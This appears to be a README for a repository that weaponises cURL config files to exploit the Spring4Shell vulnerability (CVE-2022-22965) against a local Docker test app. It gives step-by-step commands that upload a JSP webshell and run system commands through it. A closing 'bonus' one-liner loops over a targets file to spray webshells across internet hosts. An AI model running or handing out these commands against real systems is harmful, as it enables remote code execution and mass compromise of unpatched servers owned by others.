# Spring4Shell-cURL
cURL configs for exploiting Spring4Shell 


## Weaponzing cURL to Exploit Spring4Shell (CVE-2022-22965) 
I hadn't seen this method posted anywhere, just wanted to document. 99% of this is not my work. I just combined unique aspects into this repo. 


### Quick Setup

0. Clone the repo. You'll need Docker and cURL. If somehow you don't have cURL, download from: [https://everything.curl.dev/get](https://everything.curl.dev/get)
1. Deploy Docker container:  
`docker image build -t retro/stupidrumor ./ && docker container run -it --publish 8080:8080 retro/stupidrumor`.
3. Issue the cURL command:  
`curl --config request.txt http://localhost:8080/stupidRumor_war/index`. This cURL command first reads from the `requests.txt` file. Inside the `request.txt` are things like the specific headers we need to exploit the vulnerable application. Noteably, the last line is `data-binary = "@body.txt"`, which contains our POST body. 
   
   **Note:** I've configured cURL to also send our requests through a transparent application proxy (Burp) in this case on `port 8081`, not `8080` as that's already taken by the Docker app. This is mostly for troubleshooting, but good to have in your Repeater nonetheless :)
   
3. Once the cURL command is sent, the webshell (`tomcatwar.jsp`) will be uploaded to the webroot (`stupidRumor_war/`), which means you can access it here in a browser if you want: `stupidRumor_war/tomcatwar.jsp?`
4. But we're using cURL, so now issue the second cURL request:  
`curl 'http://localhost:8080/stupidRumor_war/tomcatwar.jsp?pwd=j&cmd=whoami' --output -`. 

Bonus: I guess you could do something like the following to blindly spray webshells across the internet. Not recommended:  

`for i in $(cat targets.txt); do curl --config request.txt $i:$/yougottafixurethisout | tee -a SpringerShellOutput.txt; done`


   
   
   
   
   
   
   
   
   
   
   
   
   
   ----------------
   Refs:  
[https://github.com/Retrospected/spring-rce-poc/blob/master/deploy.sh](https://github.com/Retrospected/spring-rce-poc/blob/master/deploy.sh)
